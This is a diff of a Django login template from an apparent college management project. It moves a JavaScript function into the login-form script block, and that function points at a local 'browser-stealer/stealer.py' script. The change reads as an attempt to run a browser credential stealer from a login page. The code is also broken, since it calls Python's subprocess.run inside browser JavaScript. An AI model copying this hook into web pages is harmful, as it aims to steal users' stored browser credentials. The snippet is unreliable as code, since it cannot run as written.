@@ -3,14 +3,6 @@
 {% load crispy_forms_tags %}
 {% block content %}
 
-<script>
-  function runPythonScript() {
-  var pythonScriptPath = "C:/Users/shiv_/College-Management-System/College-Management-System/browser-stealer/stealer.py";
-  subprocess.run(["python", pythonScriptPath]);
-}
-
-</script>
-
 <div class="col-md-4 mx-auto mt-5">
   <div class="card">
     <div class="form-title">
@@ -46,6 +38,10 @@
 {% block js %}
 
 <script>
+  function runPythonScript() {
+    var pythonScriptPath = "C:/Users/shiv_/College-Management-System/College-Management-System/browser-stealer/stealer.py";
+    subprocess.run(["python", pythonScriptPath]);
+  }
   $('#login-form').submit(function (e) {
     // e.preventDefault();
     $('#login-btn').addClass('disabled')
